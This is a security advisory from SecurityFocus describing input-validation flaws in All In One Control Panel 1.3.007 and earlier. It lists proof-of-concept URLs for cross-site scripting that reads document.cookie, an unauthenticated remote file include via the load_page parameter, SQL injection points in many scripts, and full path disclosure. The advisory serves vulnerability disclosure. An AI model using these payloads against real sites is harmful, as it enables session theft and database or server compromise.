source: https://www.securityfocus.com/bid/20931/info

All In One Control Panel (AIOCP) is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied input data.

Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, access or modify sensitive data, execute arbitrary script code in the context of the application, compromise the application and possibly exploit latent vulnerabilities in the underlying system; other attacks are also possible.

AIOCP 1.3.007 and prior versions are vulnerable.


Cross-site scripting =
-
http://www.example.com/public/code/cp_forum_view.php?fmode=top&amp;topid=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
http://www.example.com/public/code/cp_forum_view.php?fmode=top&amp;topid=53&amp;forid=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
http://www.example.com/public/code/cp_forum_view.php?fmode=top&amp;topid=53&amp;forid=23&amp;catid=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
http://www.example.com/public/code/cp_dpage.php?choosed_language=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
http://www.example.com/public/code/cp_forum_view.php?fmode=top&amp;topid=53&amp;forid=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
http://www.example.com/public/code/cp_forum_view.php?fmode=top&amp;topid=53&amp;forid=3&amp;catid=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
http://www.example.com/public/code/cp_show_ec_products.php?order_field=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
http://www.example.com/public/code/cp_users_online.php?order_field=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
http://www.example.com/public/code/cp_links_search.php?orderdir=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;

Remote File-Include =
/admin/code/index.php?load_page=http%3A//google.com
( no login needed for the remote file include )

SQL-Injection =
- http://www.example.com/public/code/cp_dpage.php?choosed_language=[sql]
- http://www.example.com/public/code/cp_news.php?choosed_language=[sql]
- http://www.example.com/public/code/cp_news.php?news_category=[sql]
-
http://www.example.com/public/code/cp_forum_view.php?choosed_language=[sql]
-
http://www.example.com/public/code/cp_edit_user.php?choosed_language=[sql]
-
http://www.example.com/public/code/cp_newsletter.php?nlmsg_nlcatid=[sql]
-
http://www.example.com/public/code/cp_newsletter.php?choosed_language=[sql]
- http://www.example.com/public/code/cp_links.php?links_category=[sql]
- http://www.example.com/public/code/cp_links.php?choosed_language=[sql]
-
http://www.example.com/public/code/cp_contact_us.php?choosed_language=[sql]
-
http://www.example.com/public/code/cp_show_ec_products.php?product_category_id=[sql]
-
http://www.example.com/public/code/cp_show_ec_products.php?product_category_id=[sql]
-
http://www.example.com/public/code/cp_show_ec_products.php?order_field=[sql]
- http://www.example.com/public/code/cp_login.php?choosed_language=[sql]
-
http://www.example.com/public/code/cp_users_online.php?order_field=cpsession_expiry&amp;submitted=1&amp;firstrow=[sql]
-
http://www.example.com/public/code/cp_codice_fiscale.php?choosed_language=[sql]
- http://www.example.com/public/code/cp_links_search.php?orderdir=[sql]


Full Path Disclosure =
-
http://www.example.com/public/code/cp_dpage.php?choosed_language=eng&amp;aiocp_dp[]=_main
-
http://www.example.com/public/code/cp_show_ec_products.php?order_field[]=
- http://www.example.com/public/code/cp_show_page_help.php?hp[]=